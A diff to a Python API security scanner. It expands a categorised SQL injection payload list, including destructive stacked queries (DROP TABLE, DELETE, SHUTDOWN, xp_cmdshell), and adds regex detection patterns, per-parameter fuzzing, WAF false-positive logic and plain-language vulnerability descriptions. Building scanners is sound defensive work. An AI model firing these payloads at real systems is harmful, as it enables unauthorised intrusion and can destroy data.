@@ -33,24 +33,74 @@ SECURITY_HEADERS = [
 
 # Comprehensive attack payloads
 SQLI_PAYLOADS = [
+    # Basic boolean-based payloads
     "' OR 1=1--",
     "' OR '1'='1",
-    "'; DROP TABLE users;--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "admin'--",
+    "admin'#",
+    "' OR 'x'='x",
+    "' OR 'a'='a",
+    "') OR ('1'='1",
+    "') OR ('1'='1'--",
+    "' OR 1=1 OR ''='",
+    "' OR 1=1 OR '1'='1",
+    
+    # UNION-based payloads
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
     "' UNION SELECT NULL,NULL,NULL--",
-    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "' UNION SELECT 1,2,3--",
+    "' UNION SELECT user(),database(),version()--",
+    "' UNION SELECT @@version,@@user,@@database--",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+    
+    # Error-based payloads
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
+    "' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    
+    # Time-based payloads
     "' OR SLEEP(5)--",
+    "' AND SLEEP(5)--",
     "'; WAITFOR DELAY '00:00:05'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "'; WAITFOR DELAY '00:00:10'--",
-    "' UNION SELECT version(),database(),user()--"
+    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    "' OR IF(1=1,SLEEP(5),0)--",
+    "' UNION SELECT IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--",
+    
+    # Stacked queries (dangerous)
+    "'; DROP TABLE users;--",
+    "'; INSERT INTO users VALUES('admin','password');--",
+    "'; UPDATE users SET password='hacked' WHERE username='admin';--",
+    "'; DELETE FROM users WHERE username='admin';--",
+    "'; EXEC xp_cmdshell('dir');--",
+    "'; SHUTDOWN;--",
+    
+    # Bypassing basic filters
+    "' oR 1=1--",
+    "' UnIoN SeLeCt 1,2,3--",
+    "' OR '1'='1' --",
+    "' %6fR 1=1--",
+    "' /*!OR*/ 1=1--",
+    "' /*!50000OR*/ 1=1--",
+    "' OR/**/1=1--",
+    "' OR+1=1--",
+    "' OR-1=-1--",
+    "' OR(1)=(1)--",
+    "'||(1)|(1)--",
+    
+    # Second-order and blind payloads
+    "'+(SELECT+*+FROM+(SELECT(SLEEP(5)))a)+'",
+    "1' AND (SELECT SUBSTRING(@@version,1,1))='5",
+    "1' AND (SELECT SUBSTRING(user(),1,1))='r",
+    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0",
+    "1' HAVING 1=1--",
+    "1' GROUP BY 1,2,3,4,5--",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 100--"
 ]
 
 XSS_PAYLOADS = [
@@ -234,6 +284,47 @@ except ImportError:
     # Fallback if security layer detector is not available
     security_detector = None
 
+# Vulnerability descriptions for better user understanding
+VULNERABILITY_DESCRIPTIONS = {
+    'HTTPS_NOT_ENABLED': "The API is using HTTP instead of HTTPS, which means all data is transmitted without encryption and can be intercepted by attackers.",
+    'MISSING_SECURITY_HEADERS': "Important security headers are missing, which could allow various attacks like clickjacking, XSS, or data theft.",
+    'SQL_INJECTION': "The API is vulnerable to SQL injection attacks, allowing attackers to manipulate database queries and potentially access or modify sensitive data.",
+    'XSS': "Cross-Site Scripting vulnerability allows attackers to inject malicious scripts that can steal user data or perform actions on behalf of users.",
+    'COMMAND_INJECTION': "The API allows execution of system commands, which could let attackers take control of the server.",
+    'DOUBLE_SPENDING': "The same transaction can be processed multiple times, potentially allowing users to spend money they don't have.",
+    'RACE_CONDITION': "Multiple simultaneous requests can cause unexpected behavior, potentially allowing unauthorized access or duplicate transactions.",
+    'PRIVILEGE_ESCALATION': "Users can gain higher privileges than they should have, potentially accessing admin functions or other users' data.",
+    'BOLA_ATTACK': "Broken Object Level Authorization - users can access data belonging to other users by manipulating IDs or parameters.",
+    'TRANSACTION_MANIPULATION': "Transaction amounts or details can be modified in unauthorized ways, potentially allowing fraud.",
+    'SESSION_FIXATION': "Old or invalid session tokens are accepted, which could allow attackers to hijack user sessions.",
+    'KYC_BYPASS': "Know Your Customer verification can be bypassed, potentially allowing unauthorized users to access financial services.",
+    'LOAN_ABUSE': "Loan approval logic can be manipulated, potentially allowing unqualified users to get loans they shouldn't receive.",
+    'DISCOUNT_ABUSE': "Discount codes or promotional offers can be used multiple times or in unintended ways.",
+    'WEBHOOK_ABUSE': "Malicious webhook URLs are accepted, which could redirect sensitive data to attacker-controlled servers.",
+    'OPEN_REDIRECT': "The API redirects users to attacker-controlled websites, which can be used for phishing attacks.",
+    'MICRO_TRANSACTION_ABUSE': "Very small transactions can be processed rapidly without proper controls, potentially enabling theft through automation.",
+    'IDEMPOTENCY_FAILURE': "The same request can be processed multiple times when it should only be processed once, leading to duplicate transactions.",
+    'VERBOSE_ERROR': "Error messages reveal too much technical information that could help attackers understand the system's structure.",
+    'METADATA_LEAKAGE': "Sensitive system information (like server details, internal IPs, or user data) is exposed in responses or headers.",
+    'OPEN_ENDPOINT': "API endpoints are accessible without proper authentication, potentially exposing sensitive functionality.",
+    'XXE_VULNERABILITY': "XML External Entity attack allows reading local files or making network requests from the server.",
+    'SSRF_VULNERABILITY': "Server-Side Request Forgery allows making requests to internal systems that should not be accessible.",
+    'AUTH_BYPASS': "Authentication can be bypassed using common or weak credentials, allowing unauthorized access."
+}
+
+def get_vulnerability_description(vuln_type):
+    """Get human-readable description for a vulnerability type"""
+    # Extract the main vulnerability type from the full message
+    for key in VULNERABILITY_DESCRIPTIONS:
+        if key in vuln_type:
+            return VULNERABILITY_DESCRIPTIONS[key]
+    return "Security issue detected that requires investigation."
+
+def format_vulnerability_message(vuln_type, technical_details):
+    """Format vulnerability message with both technical details and human description"""
+    description = get_vulnerability_description(vuln_type)
+    return f"{technical_details}\n   💡 What this means: {description}"
+
 def is_false_positive(response, baseline_response=None, payload="", attack_type=""):
     """
     Comprehensive false positive detection function with advanced validation
@@ -256,7 +347,35 @@ def is_false_positive(response, baseline_response=None, payload="", attack_type=
             # If any security layer blocked the request, it's a false positive
             return True
     
-    # Fallback to simple validation
+    # Fallback to simple validation with attack-type specific logic
+    
+    # For SQL injection, be less aggressive about false positives
+    if attack_type == "sql_injection":
+        # Only consider it a false positive if it's clearly a WAF block page
+        waf_block_indicators = [
+            ('<!doctype html>' in response.text.lower() and 'blocked' in response.text.lower()),
+            ('cloudflare' in response.text.lower() and 'ray id' in response.text.lower()),
+            (response.status_code == 403 and len(response.text) < 1000 and 'access denied' in response.text.lower())
+        ]
+        
+        if any(waf_block_indicators):
+            return True  # Clear WAF block = false positive
+        
+        # If we have SQL error indicators, it's likely a real vulnerability
+        sql_error_indicators = [
+            'sql syntax', 'mysql_fetch', 'ora-', 'sqlite_', 'postgresql', 
+            'error in your sql', 'mysql error', 'database error'
+        ]
+        if any(indicator in response.text.lower() for indicator in sql_error_indicators):
+            return False  # SQL errors = likely real vulnerability
+        
+        # Check if response is identical to baseline (no change = false positive)
+        if baseline_response and response.text == baseline_response.text:
+            return True  # Identical response = false positive
+        
+        return False  # For SQL injection, err on the side of reporting vulnerabilities
+    
+    # General false positive detection for other attack types
     # Check for WAF block page indicators
     waf_indicators = ['<!doctype', '<html', '<head', '<body', 'cloudflare', 'access denied', 'forbidden', 'ray id', 'blocked', 'security']
     if any(waf_indicator in response.text.lower() for waf_indicator in waf_indicators):
@@ -415,7 +534,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
             if check == 'https_check':
                 # HTTPS check
                 if not api_url.startswith('https://'):
-                    vulnerabilities['critical'].append("HTTPS_NOT_ENABLED: API is not using HTTPS")
+                    vuln_msg = format_vulnerability_message("HTTPS_NOT_ENABLED", "HTTPS_NOT_ENABLED: API is not using HTTPS")
+                    vulnerabilities['critical'].append(vuln_msg)
                 update_progress_both(i, check, "complete")
             
             elif check == 'security_headers':
@@ -426,14 +546,17 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         missing_headers.append(header)
                 
                 if missing_headers:
-                    vulnerabilities['medium'].append(f"MISSING_SECURITY_HEADERS: {', '.join(missing_headers)}")
+                    vuln_msg = format_vulnerability_message("MISSING_SECURITY_HEADERS", f"MISSING_SECURITY_HEADERS: {', '.join(missing_headers)}")
+                    vulnerabilities['medium'].append(vuln_msg)
                 update_progress_both(i, check, "complete")
             
             elif check == 'sql_injection':
-                # SQL Injection check
+                # Enhanced SQL Injection check
                 sqli_vulnerabilities = []
                 
-                # Enhanced SQL injection detection patterns - prioritizing WAF-triggering payloads
+                print(f"   🔍 Starting SQL injection detection for: {api_url}")
+                
+                # Enhanced SQL injection detection patterns
                 sql_patterns = [
                     # High-priority WAF-triggering patterns (these get blocked by Cloudflare)
                     "'; DROP TABLE users;--",
@@ -484,17 +607,151 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                     parsed_url = urlparse(api_url)
                     params = parse_qs(parsed_url.query)
                     
+                    print(f"   📊 Found {len(params)} URL parameters to analyze")
+                    
                     for param_name, param_values in params.items():
                         for value in param_values:
                             decoded_value = unquote(value)
+                            print(f"   🔎 Analyzing parameter '{param_name}': {decoded_value}")
                             
-                            # Check for SQL injection patterns in existing parameters
+                            # Enhanced SQL injection pattern detection
+                            sql_injection_detected = False
+                            detected_patterns = []
+                            
+                            # Check for obvious SQL injection patterns
+                            obvious_sql_patterns = [
+                                r"'\s*or\s+1\s*=\s*1", r"'\s*or\s+['\"]1['\"]=['\"]1['\"]",
+                                r"'\s*and\s+1\s*=\s*1", r"'\s*union\s+select", r"'\s*;\s*drop\s+table",
+                                r"'\s*;\s*delete\s+from", r"'\s*;\s*insert\s+into", r"'\s*;\s*update\s+",
+                                r"'\s*--", r"'\s*#", r"'\s*/\*", r"admin'\s*--", r"'\s*or\s+'x'='x",
+                                r"1'\s*or\s+'1'='1", r"'\s*or\s+1=1\s*--", r"'\s*or\s+['\"]x['\"]=['\"]x['\"]",
+                                r"'\s*waitfor\s+delay", r"'\s*;\s*waitfor", r"'\s*sleep\s*\(", r"'\s*and\s+sleep\s*\("
+                            ]
+                            
+                            import re
+                            for pattern in obvious_sql_patterns:
+                                if re.search(pattern, decoded_value, re.IGNORECASE):
+                                    sql_injection_detected = True
+                                    detected_patterns.append(pattern)
+                                    print(f"   🚨 SQL injection pattern detected in {param_name}: {pattern}")
+                            
+                            # Also check the original simple string patterns for backward compatibility
                             for pattern in sql_patterns:
                                 if pattern.lower() in decoded_value.lower():
-                                    sqli_vulnerabilities.append(f"EXISTING_PARAM_{param_name}: {decoded_value} | SQL Injection Pattern: {pattern}")
-                                    break
+                                    sql_injection_detected = True
+                                    detected_patterns.append(pattern)
+                                    print(f"   🚨 SQL injection pattern detected in {param_name}: {pattern}")
+                            
+                            # Check for SQL injection indicators in the parameter value
+                            sql_indicators_in_value = [
+                                "' or ", "' and ", "' union ", "' select ", "' drop ", "' delete ", 
+                                "' insert ", "' update ", "admin'--", "' or 1=1", "or 1=1--",
+                                "' or '1'='1", "or '1'='1", "1' or 1=1", "1'or'1'='1", 
+                                "' waitfor delay", "' sleep(", "; drop table", "; delete from",
+                                "union select", "information_schema", "@@version", "database()"
+                            ]
+                            
+                            for indicator in sql_indicators_in_value:
+                                if indicator.lower() in decoded_value.lower():
+                                    sql_injection_detected = True
+                                    detected_patterns.append(indicator)
+                                    print(f"   🚨 SQL injection indicator found in {param_name}: {indicator}")
+                            
+                            if sql_injection_detected:
+                                vuln_msg = format_vulnerability_message(
+                                    "SQL_INJECTION", 
+                                    f"EXISTING_PARAM_{param_name}: {decoded_value} | SQL Injection detected (patterns: {', '.join(detected_patterns[:3])})"
+                                )
+                                sqli_vulnerabilities.append(vuln_msg)
+                                print(f"   🚨 CONFIRMED: SQL injection vulnerability in parameter '{param_name}'")
+                            else:
+                                print(f"   ✅ Parameter '{param_name}' appears clean")
                 
-                # Test with SQL injection payloads
+                # Enhanced detection - test each existing parameter individually
+                if '?' in api_url:
+                    from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse
+                    parsed_url = urlparse(api_url)
+                    params = parse_qs(parsed_url.query)
+                    
+                    for param_name in params.keys():
+                        print(f"   🎯 Testing parameter '{param_name}' with SQL injection payloads")
+                        
+                        for payload in SQLI_PAYLOADS[:10]:  # Test top 10 payloads per parameter
+                            try:
+                                # Create new params with this parameter modified
+                                test_params = params.copy()
+                                test_params[param_name] = [payload]
+                                
+                                # Reconstruct URL with modified parameter
+                                new_query = urlencode(test_params, doseq=True)
+                                test_url = urlunparse((
+                                    parsed_url.scheme,
+                                    parsed_url.netloc,
+                                    parsed_url.path,
+                                    parsed_url.params,
+                                    new_query,
+                                    parsed_url.fragment
+                                ))
+                                
+                                sqli_resp = req_func(test_url, headers=headers, data=data)
+                                
+                                if sqli_resp:
+                                    # Enhanced SQL injection detection
+                                    vulnerability_detected = False
+                                    detection_reason = ""
+                                    
+                                    # 1. Check for SQL error messages (broader detection)
+                                    sql_error_indicators = [
+                                        'sql', 'mysql', 'postgresql', 'oracle', 'sqlite', 'database', 'table', 'column', 'syntax',
+                                        'you have an error in your sql syntax', 'mysql_fetch', 'ora-', 'microsoft jet database engine',
+                                        'odbc', 'ole db', 'sqlite_', 'error in your sql', 'quoted string not properly terminated',
+                                        'unclosed quotation mark', 'incorrect syntax near', 'unexpected end of sql command',
+                                        'warning: mysql', 'function.mysql', 'mysql result', 'mysql error', 'mysql warning',
+                                        'pg_', 'postgresql', 'psql', 'column', 'relation', 'operator does not exist',
+                                        'division by zero', 'data type', 'invalid input syntax'
+                                    ]
+                                    
+                                    if any(indicator in sqli_resp.text.lower() for indicator in sql_error_indicators):
+                                        vulnerability_detected = True
+                                        detection_reason = "SQL error message detected"
+                                    
+                                    # 2. Check for timing-based indicators (if response time is significantly different)
+                                    elif hasattr(sqli_resp, 'elapsed') and sqli_resp.elapsed.total_seconds() > 5:
+                                        vulnerability_detected = True
+                                        detection_reason = f"Time-based SQL injection (response time: {sqli_resp.elapsed.total_seconds()}s)"
+                                    
+                                    # 3. Check for boolean-based indicators (different response size/content)
+                                    elif resp and abs(len(sqli_resp.text) - len(resp.text)) > 100:
+                                        vulnerability_detected = True
+                                        detection_reason = f"Boolean-based SQL injection (response size difference: {abs(len(sqli_resp.text) - len(resp.text))} chars)"
+                                    
+                                    # 4. Check for UNION-based indicators
+                                    elif 'union' in payload.lower() and sqli_resp.status_code == 200:
+                                        # Look for signs of successful UNION injection
+                                        union_indicators = ['admin', 'user', 'database', 'version', 'null', '1,2,3', 'information_schema']
+                                        if any(indicator in sqli_resp.text.lower() for indicator in union_indicators):
+                                            vulnerability_detected = True
+                                            detection_reason = "UNION-based SQL injection detected"
+                                    
+                                    # 5. Less aggressive false positive check
+                                    if vulnerability_detected:
+                                        # Only skip if it's clearly a WAF block page (HTML content)
+                                        is_waf_block = (
+                                            sqli_resp.status_code == 403 or
+                                            ('<!doctype html>' in sqli_resp.text.lower() and 'blocked' in sqli_resp.text.lower()) or
+                                            ('cloudflare' in sqli_resp.text.lower() and 'ray id' in sqli_resp.text.lower())
+                                        )
+                                        
+                                        if not is_waf_block:
+                                            vuln_msg = format_vulnerability_message("SQL_INJECTION", f"PARAM_{param_name}: {payload} | {detection_reason}")
+                                            sqli_vulnerabilities.append(vuln_msg)
+                                            print(f"   🚨 SQL injection vulnerability detected in {param_name}: {detection_reason}")
+                                
+                            except Exception as e:
+                                print(f"   ⚠️ Error testing parameter {param_name}: {e}")
+                                continue
+                
+                # Test with additional SQL injection payloads (add to existing URL)
                 for payload in SQLI_PAYLOADS:
                     try:
                         # Test URL parameters
@@ -502,10 +759,15 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         sqli_resp = req_func(test_url, headers=headers, data=data)
                         
                         if sqli_resp and not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
-                            # Check for SQL injection indicators
-                            sql_indicators = ['sql', 'mysql', 'postgresql', 'oracle', 'sqlite', 'database', 'table', 'column', 'syntax']
+                            # Enhanced SQL injection indicators
+                            sql_indicators = [
+                                'sql', 'mysql', 'postgresql', 'oracle', 'sqlite', 'database', 'table', 'column', 'syntax',
+                                'error in your sql', 'mysql_fetch', 'ora-', 'odbc', 'ole db', 'sqlite_',
+                                'warning: mysql', 'postgresql error', 'division by zero', 'invalid input syntax'
+                            ]
                             if any(indicator in sqli_resp.text.lower() for indicator in sql_indicators):
-                                sqli_vulnerabilities.append(f"URL_PARAM: {payload} | SQL Injection detected")
+                                vuln_msg = format_vulnerability_message("SQL_INJECTION", f"URL_PARAM: {payload} | SQL Injection detected")
+                                sqli_vulnerabilities.append(vuln_msg)
                         
                         # Test POST body if applicable
                         if data and method in ["POST", "PUT"]:
@@ -514,13 +776,18 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             
                             if sqli_resp and not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                 if any(indicator in sqli_resp.text.lower() for indicator in sql_indicators):
-                                    sqli_vulnerabilities.append(f"POST_BODY: {payload} | SQL Injection detected")
+                                    vuln_msg = format_vulnerability_message("SQL_INJECTION", f"POST_BODY: {payload} | SQL Injection detected")
+                                    sqli_vulnerabilities.append(vuln_msg)
                         
                     except Exception as e:
                         continue
                 
                 if sqli_vulnerabilities:
                     vulnerabilities['critical'].extend(sqli_vulnerabilities)
+                    print(f"   ✅ Found {len(sqli_vulnerabilities)} SQL injection vulnerabilities")
+                else:
+                    print(f"   ✅ No SQL injection vulnerabilities detected")
+                    
                 progress.complete_check(f"Running {check}...", "complete")
             
             elif check == 'xss':
@@ -536,7 +803,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         if xss_resp and not is_false_positive(xss_resp, resp, payload, "xss"):
                             # Check if payload is reflected in response
                             if payload.lower() in xss_resp.text.lower():
-                                xss_vulnerabilities.append(f"URL_PARAM: {payload} | XSS payload reflected")
+                                vuln_msg = format_vulnerability_message("XSS", f"URL_PARAM: {payload} | XSS payload reflected")
+                                xss_vulnerabilities.append(vuln_msg)
                         
                         # Test POST body if applicable
                         if data and method in ["POST", "PUT"]:
@@ -545,7 +813,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             
                             if xss_resp and not is_false_positive(xss_resp, resp, payload, "xss"):
                                 if payload.lower() in xss_resp.text.lower():
-                                    xss_vulnerabilities.append(f"POST_BODY: {payload} | XSS payload reflected")
+                                    vuln_msg = format_vulnerability_message("XSS", f"POST_BODY: {payload} | XSS payload reflected")
+                                    xss_vulnerabilities.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -578,7 +847,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             # Check for command injection indicators
                             cmd_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                             if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
-                                cmd_vulnerabilities.append(f"URL_PARAM: {payload} | Command injection detected")
+                                vuln_msg = format_vulnerability_message("COMMAND_INJECTION", f"URL_PARAM: {payload} | Command injection detected")
+                                cmd_vulnerabilities.append(vuln_msg)
                         
                         # Test POST body if applicable
                         if data and method in ["POST", "PUT"]:
@@ -587,7 +857,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             
                             if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                 if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
-                                    cmd_vulnerabilities.append(f"POST_BODY: {payload} | Command injection detected")
+                                    vuln_msg = format_vulnerability_message("COMMAND_INJECTION", f"POST_BODY: {payload} | Command injection detected")
+                                    cmd_vulnerabilities.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -610,7 +881,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             # Check for command output indicators
                             cmd_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                             if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
-                                cmd_vulnerabilities.append(f"URL_PARAM: {payload} | Command injection detected")
+                                vuln_msg = format_vulnerability_message("COMMAND_INJECTION", f"URL_PARAM: {payload} | Command injection detected")
+                                cmd_vulnerabilities.append(vuln_msg)
                         
                         # Test POST body if applicable
                         if data and method in ["POST", "PUT"]:
@@ -619,7 +891,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             
                             if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                 if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
-                                    cmd_vulnerabilities.append(f"POST_BODY: {payload} | Command injection detected")
+                                    vuln_msg = format_vulnerability_message("COMMAND_INJECTION", f"POST_BODY: {payload} | Command injection detected")
+                                    cmd_vulnerabilities.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -644,7 +917,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         # Check if all responses are successful (potential double spending)
                         if len(responses) >= 2 and all(r.status_code == 200 for r in responses):
-                            double_spending_vulns.append(f"DOUBLE_SPENDING: {payload} | All requests succeeded")
+                            vuln_msg = format_vulnerability_message("DOUBLE_SPENDING", f"DOUBLE_SPENDING: {payload} | All requests succeeded")
+                            double_spending_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -684,7 +958,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         # Check for race condition indicators
                         successful_responses = [r for r in responses if r.status_code == 200]
                         if len(successful_responses) > 1:
-                            race_condition_vulns.append(f"RACE_CONDITION: {payload} | {len(successful_responses)} concurrent requests succeeded")
+                            vuln_msg = format_vulnerability_message("RACE_CONDITION", f"RACE_CONDITION: {payload} | {len(successful_responses)} concurrent requests succeeded")
+                            race_condition_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -703,11 +978,13 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "privilege_escalation"):
                             if test_resp.status_code == 200:
-                                privilege_vulns.append(f"PRIVILEGE_ESCALATION: {payload} | Admin access granted")
+                                vuln_msg = format_vulnerability_message("PRIVILEGE_ESCALATION", f"PRIVILEGE_ESCALATION: {payload} | Admin access granted")
+                                privilege_vulns.append(vuln_msg)
                             elif test_resp.status_code == 403:
                                 # Check if response contains admin-related content
                                 if any(admin_term in test_resp.text.lower() for admin_term in ['admin', 'super', 'privilege']):
-                                    privilege_vulns.append(f"PRIVILEGE_ESCALATION: {payload} | Admin content in response")
+                                    vuln_msg = format_vulnerability_message("PRIVILEGE_ESCALATION", f"PRIVILEGE_ESCALATION: {payload} | Admin content in response")
+                                    privilege_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -729,7 +1006,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                                 # Look for sensitive data in response
                                 sensitive_indicators = ['account', 'balance', 'transaction', 'personal', 'ssn', 'pan', 'aadhaar']
                                 if any(indicator in test_resp.text.lower() for indicator in sensitive_indicators):
-                                    bola_vulns.append(f"BOLA_ATTACK: {payload} | Unauthorized access to sensitive data")
+                                    vuln_msg = format_vulnerability_message("BOLA_ATTACK", f"BOLA_ATTACK: {payload} | Unauthorized access to sensitive data")
+                                    bola_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -748,9 +1026,11 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "transaction_manipulation"):
                             if test_resp.status_code == 200:
-                                transaction_vulns.append(f"TRANSACTION_MANIPULATION: {payload} | Request succeeded with invalid amount")
+                                vuln_msg = format_vulnerability_message("TRANSACTION_MANIPULATION", f"TRANSACTION_MANIPULATION: {payload} | Request succeeded with invalid amount")
+                                transaction_vulns.append(vuln_msg)
                             elif test_resp.status_code == 500:
-                                transaction_vulns.append(f"TRANSACTION_MANIPULATION: {payload} | Server error indicates potential vulnerability")
+                                vuln_msg = format_vulnerability_message("TRANSACTION_MANIPULATION", f"TRANSACTION_MANIPULATION: {payload} | Server error indicates potential vulnerability")
+                                transaction_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -769,11 +1049,13 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "session_fixation"):
                             if test_resp.status_code == 200:
-                                session_vulns.append(f"SESSION_FIXATION: {payload} | Stale token accepted")
+                                vuln_msg = format_vulnerability_message("SESSION_FIXATION", f"SESSION_FIXATION: {payload} | Stale token accepted")
+                                session_vulns.append(vuln_msg)
                             elif test_resp.status_code == 401:
                                 # Check if response reveals token information
                                 if any(token_term in test_resp.text.lower() for token_term in ['token', 'session', 'jwt', 'auth']):
-                                    session_vulns.append(f"SESSION_FIXATION: {payload} | Token information leaked")
+                                    vuln_msg = format_vulnerability_message("SESSION_FIXATION", f"SESSION_FIXATION: {payload} | Token information leaked")
+                                    session_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -792,9 +1074,11 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "kyc_bypass"):
                             if test_resp.status_code == 200:
-                                kyc_vulns.append(f"KYC_BYPASS: {payload} | KYC verification bypassed")
+                                vuln_msg = format_vulnerability_message("KYC_BYPASS", f"KYC_BYPASS: {payload} | KYC verification bypassed")
+                                kyc_vulns.append(vuln_msg)
                             elif test_resp.status_code == 500:
-                                kyc_vulns.append(f"KYC_BYPASS: {payload} | Server error in KYC processing")
+                                vuln_msg = format_vulnerability_message("KYC_BYPASS", f"KYC_BYPASS: {payload} | Server error in KYC processing")
+                                kyc_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -813,9 +1097,11 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "loan_abuse"):
                             if test_resp.status_code == 200:
-                                loan_vulns.append(f"LOAN_ABUSE: {payload} | Loan approved with invalid criteria")
+                                vuln_msg = format_vulnerability_message("LOAN_ABUSE", f"LOAN_ABUSE: {payload} | Loan approved with invalid criteria")
+                                loan_vulns.append(vuln_msg)
                             elif test_resp.status_code == 500:
-                                loan_vulns.append(f"LOAN_ABUSE: {payload} | Server error in loan processing")
+                                vuln_msg = format_vulnerability_message("LOAN_ABUSE", f"LOAN_ABUSE: {payload} | Server error in loan processing")
+                                loan_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -834,9 +1120,11 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "discount_abuse"):
                             if test_resp.status_code == 200:
-                                discount_vulns.append(f"DISCOUNT_ABUSE: {payload} | Discount applied multiple times")
+                                vuln_msg = format_vulnerability_message("DISCOUNT_ABUSE", f"DISCOUNT_ABUSE: {payload} | Discount applied multiple times")
+                                discount_vulns.append(vuln_msg)
                             elif test_resp.status_code == 500:
-                                discount_vulns.append(f"DISCOUNT_ABUSE: {payload} | Server error in discount processing")
+                                vuln_msg = format_vulnerability_message("DISCOUNT_ABUSE", f"DISCOUNT_ABUSE: {payload} | Server error in discount processing")
+                                discount_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -855,9 +1143,11 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                         
                         if test_resp and not is_false_positive(test_resp, resp, payload, "webhook_abuse"):
                             if test_resp.status_code == 200:
-                                webhook_vulns.append(f"WEBHOOK_ABUSE: {payload} | Malicious webhook accepted")
+                                vuln_msg = format_vulnerability_message("WEBHOOK_ABUSE", f"WEBHOOK_ABUSE: {payload} | Malicious webhook accepted")
+                                webhook_vulns.append(vuln_msg)
                             elif test_resp.status_code == 500:
-                                webhook_vulns.append(f"WEBHOOK_ABUSE: {payload} | Server error in webhook processing")
+                                vuln_msg = format_vulnerability_message("WEBHOOK_ABUSE", f"WEBHOOK_ABUSE: {payload} | Server error in webhook processing")
+                                webhook_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -878,7 +1168,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
                             if test_resp.status_code in [200, 302, 301]:
                                 # Check if response contains redirect to malicious URL
                                 if any(malicious_url in test_resp.text.lower() for malicious_url in ['attacker.com', 'malicious.com', 'phishing.com']):
-                                    redirect_vulns.append(f"OPEN_REDIRECT: {payload} | Redirect to malicious URL")
+                                    vuln_msg = format_vulnerability_message("OPEN_REDIRECT", f"OPEN_REDIRECT: {payload} | Redirect to malicious URL")
+                                    redirect_vulns.append(vuln_msg)
                         
                     except Exception as e:
                         continue
@@ -904,7 +1195,8 @@ def scan_api(api_url, curl_info=None, severity='all', progress_callback=None):
